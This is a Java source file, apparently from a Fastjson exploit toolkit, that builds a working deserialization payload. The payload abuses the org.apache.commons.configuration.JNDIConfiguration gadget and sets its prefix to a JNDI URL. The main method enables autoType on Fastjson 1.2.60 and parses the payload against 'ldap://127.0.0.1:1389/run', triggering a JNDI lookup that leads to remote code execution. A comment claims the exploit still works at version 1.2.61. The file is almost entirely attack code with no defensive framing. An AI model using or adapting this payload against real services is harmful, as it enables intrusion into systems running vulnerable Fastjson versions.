package fastjsonExp;

import org.apache.commons.configuration.JNDIConfiguration;
import utils.FastjsonVersionCtr;
import utils.StringUtils;
import javax.naming.NamingException;

/**
 * 完成
 * org.apache.commons.configuration.JNDIConfiguration
 * still work at fastjson 1.2.61
 */
public class EXP4apache_commons_config {

    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"replace_here\"}";
    public  void actual_fun(String url) throws NamingException {
        JNDIConfiguration jndiConfiguration = new JNDIConfiguration();
        jndiConfiguration.setPrefix(JNDI_URL);
        jndiConfiguration.getBaseContext();
    }

    public  void actual_fun() throws NamingException {
        if(!StringUtils.isNull(this.JNDI_URL)){
            actual_fun(this.JNDI_URL);
        }
    }
    public EXP4apache_commons_config(){}
    public EXP4apache_commons_config(String uri){
        this.JNDI_URL = uri;
        this.payload = this.payload.replace("replace_here",uri);
        System.out.println(this.payload);
    }
    public String getPayload(){
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.60");
        myFastjson.mySetAutoType(true);
        EXP4apache_commons_config exp = new EXP4apache_commons_config("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();

    }


}
